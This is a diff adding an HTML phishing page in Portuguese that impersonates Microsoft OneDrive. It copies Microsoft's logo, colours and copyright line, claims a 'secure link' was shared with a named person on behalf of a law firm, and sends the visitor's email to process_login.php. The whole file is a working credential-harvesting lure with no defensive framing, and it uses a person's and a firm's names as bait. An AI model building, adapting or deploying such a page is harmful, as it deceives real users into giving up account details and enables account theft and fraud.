@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+
+<html lang="pt-br">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Verificar Sua Identidade - Microsoft OneDrive</title>
+<link href="local_resources/css/3d9908d1747a8a161974edf094502019.css" rel="stylesheet"/>
+<style>
+        body {
+            background-color: #f3f2f1;
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        }
+        .navbar {
+            background-color: #0078d4;
+        }
+        .navbar-brand {
+            color: white !important; /* Adiciona esta linha */
+            font-size: 1.25rem;
+        }
+        .verification-container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .verification-header img {
+            display: block;
+            margin: 0 auto;
+            width: 100px;
+        }
+        .verification-header h2 {
+            text-align: center;
+            font-size: 1.5rem;
+            margin-top: 15px;
+        }
+        .verification-form .btn-primary {
+            background-color: #0078d4;
+            border-color: #0078d4;
+        }
+        .verification-form .btn-primary:hover {
+            background-color: #005a9e;
+            border-color: #005a9e;
+        }
+        .small-text {
+            font-size: 0.75rem;
+            color: #666;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+<!-- Navbar -->
+<nav class="navbar navbar-expand-lg navbar-light">
+<a class="navbar-brand text-white" href="#">OneDrive</a>
+</nav>
+<!-- Verification Container -->
+<div class="verification-container">
+<div class="verification-header">
+<img alt="Microsoft Logo" src="local_resources/img/7f405eb9cd90b485e0c36650afe51a06.png"/>
+<h2>Verificar Sua Identidade</h2>
+</div>
+<p class="text-center">Você recebeu um link seguro para: <strong>Robertson Emerencianno</strong></p>
+<p class="text-center">Para abrir este link seguro, é necessário inserir o email para o qual este item foi compartilhado.</p>
+<form action="process_login.php" class="verification-form" method="POST">
+<div class="form-group">
+<input class="form-control" id="email" name="email" placeholder="Inserir email" required="" type="email"/>
+</div>
+<button class="btn btn-primary btn-block" type="submit">Avançar</button>
+</form>
+<p class="small-text mt-3">Ao clicar em Avançar você permite que Emerencianno, Baggio e Associados - Advogados usem seu endereço de email de acordo com suas <a href="#">políticas de privacidade</a>.</p>
+<p class="small-text">© 2017 Microsoft    <a href="#">Privacy &amp; Cookies</a></p>
+</div>
+</body>
+</html>
